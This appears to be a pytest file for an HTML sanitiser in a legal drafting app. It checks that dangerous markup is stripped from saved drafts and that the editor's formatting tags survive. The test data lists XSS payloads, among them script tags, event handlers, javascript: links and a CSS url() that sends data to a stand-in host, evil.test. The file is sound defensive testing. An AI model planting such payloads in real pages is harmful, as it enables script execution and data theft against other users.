"""Lawyer-authored draft HTML is sanitised before it is stored or returned.

`save_draft` validated length and ownership but never CONTENT, and the Drafter
echoes `draft.content` straight back into a contentEditable through
dangerouslySetInnerHTML. A draft therefore executed in whoever opened it —
including a different user than the one who wrote it, since a draft can be
attached to a case.

The allowlist is derived from the editor's 21 execCommand calls, not guessed, so
these tests assert BOTH directions:

  * script/handler/exfil markup is removed;
  * every formatting button the toolbar actually offers survives.

The second half is the one that matters in review. A sanitiser that strips
everything passes every security test and silently destroys the product — which
is exactly what the allowlist in the original plan would have done to font
family, font size, superscript, subscript and strikethrough.

Pure functions, no Mongo, no network.
"""
import pytest

from app.services.document_service import _clean_draft_html, _draft_out


# ── what must not survive ────────────────────────────────────────────────────

@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='https://evil.test'></iframe>",
    "<object data='x'></object>",
    "<embed src='x'>",
    "<svg onload=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<form action='https://evil.test'><input name=p></form>",
    "<style>body{display:none}</style>",
    "<link rel=stylesheet href='https://evil.test/x.css'>",
    "<meta http-equiv=refresh content='0;url=https://evil.test'>",
    "<base href='https://evil.test/'>",
])
def test_dangerous_markup_is_removed(payload):
    cleaned = _clean_draft_html(f"<p>Before</p>{payload}<p>After</p>")

    for bad in ("script", "onerror", "onload", "iframe", "javascript:",
                "<object", "<embed", "<form", "<style", "<link", "<meta", "<base"):
        assert bad not in cleaned.lower(), f"{bad!r} survived in {cleaned!r}"


def test_surrounding_text_is_preserved_when_markup_is_stripped():
    """Stripping must not take the lawyer's words with it."""
    cleaned = _clean_draft_html("<p>The plaintiff</p><script>x()</script><p>claims damages</p>")

    assert "The plaintiff" in cleaned
    assert "claims damages" in cleaned


def test_event_handlers_are_stripped_from_allowed_tags():
    cleaned = _clean_draft_html('<p onclick="steal()">Clause 1</p>')

    assert "onclick" not in cleaned.lower()
    assert "Clause 1" in cleaned


def test_style_attribute_is_dropped():
    """nh3 does not filter CSS, so an allowed style attribute would still admit
    url(...) — a data-exfil vector inside an otherwise sanitised draft."""
    cleaned = _clean_draft_html(
        '<p style="background:url(https://evil.test/collect?c=1)">Terms</p>')

    assert "style" not in cleaned.lower()
    assert "evil.test" not in cleaned
    assert "Terms" in cleaned


# ── what MUST survive: every toolbar button ──────────────────────────────────

@pytest.mark.parametrize("html,must_keep", [
    ("<b>bold</b>", "<b>"),
    ("<strong>bold</strong>", "<strong>"),
    ("<i>italic</i>", "<i>"),
    ("<em>italic</em>", "<em>"),
    ("<u>underline</u>", "<u>"),
    ("<s>struck</s>", "<s>"),
    ("<strike>struck</strike>", "strike"),
    ("<sub>sub</sub>", "<sub>"),
    ("<sup>sup</sup>", "<sup>"),
    ("<ul><li>one</li></ul>", "<li>"),
    ("<ol><li>one</li></ol>", "<ol>"),
    ("<h1>Heading</h1>", "<h1>"),
    ("<h2>Heading</h2>", "<h2>"),
    ("<h3>Heading</h3>", "<h3>"),
    ("<blockquote>quoted</blockquote>", "<blockquote>"),
    ("<hr>", "<hr"),
    ("<br>", "<br"),
    ("<p>para</p>", "<p>"),
    ("<div>block</div>", "<div>"),
    ("<span>inline</span>", "<span>"),
])
def test_editor_formatting_survives(html, must_keep):
    """Each of these corresponds to a button a lawyer can press."""
    assert must_keep in _clean_draft_html(html)


def test_font_family_and_size_survive():
    """execCommand fontName/fontSize with styleWithCSS=false emits <font>.
    The original plan's allowlist dropped this tag, silently disabling two
    toolbar controls."""
    cleaned = _clean_draft_html('<font face="Georgia" size="4">Text</font>')

    assert "font" in cleaned
    assert "Georgia" in cleaned
    assert 'size="4"' in cleaned


def test_alignment_attribute_survives():
    cleaned = _clean_draft_html('<div align="center">Centred</div>')

    assert 'align="center"' in cleaned


def test_a_realistic_draft_round_trips_intact():
    draft = (
        '<h1>IN THE CIVIL COURT</h1>'
        '<p align="center"><b>SUIT NO. 123/2026</b></p>'
        '<p><font face="Georgia" size="3">The plaintiff, <i>Ali</i>, states:</font></p>'
        '<ol><li>That the defendant owes PKR 500,000.</li>'
        '<li>That demand was made on 1<sup>st</sup> January.</li></ol>'
        '<blockquote>Verified true to the best of my knowledge.</blockquote><hr>'
    )
    cleaned = _clean_draft_html(draft)

    for fragment in ("IN THE CIVIL COURT", "SUIT NO. 123/2026", "Ali",
                     "PKR 500,000", "Georgia", "<sup>", "<ol>", "<blockquote>"):
        assert fragment in cleaned, f"lost {fragment!r}"


# ── applied on read as well as write ─────────────────────────────────────────

def test_draft_out_cleans_legacy_rows():
    """Rows stored before sanitisation existed are cleaned on the way out, so
    no migration is required."""
    out = _draft_out({
        "_id": "d1", "owner_id": "u1",
        "content": '<p>Clause</p><script>alert(1)</script>',
    })

    assert "script" not in out["content"].lower()
    assert "Clause" in out["content"]
    assert out["id"] == "d1"


def test_draft_out_leaves_clean_content_alone():
    out = _draft_out({"_id": "d2", "owner_id": "u1", "content": "<p>Clause 1</p>"})

    assert "Clause 1" in out["content"]


def test_empty_content_is_handled():
    assert _clean_draft_html("") == ""
    assert _clean_draft_html(None) is None


# ── ordering: the size cap applies to what the client sent ───────────────────

def test_size_cap_is_checked_before_sanitising():
    """Otherwise a huge payload could be smuggled past the cap by relying on the
    strip to shrink it below the limit."""
    import inspect

    from app.services import document_service

    src = inspect.getsource(document_service.save_draft)
    cap_at = src.index("_MAX_DRAFT_CONTENT")
    clean_at = src.index("_clean_draft_html")
    assert cap_at < clean_at, "sanitisation must come after the size check"
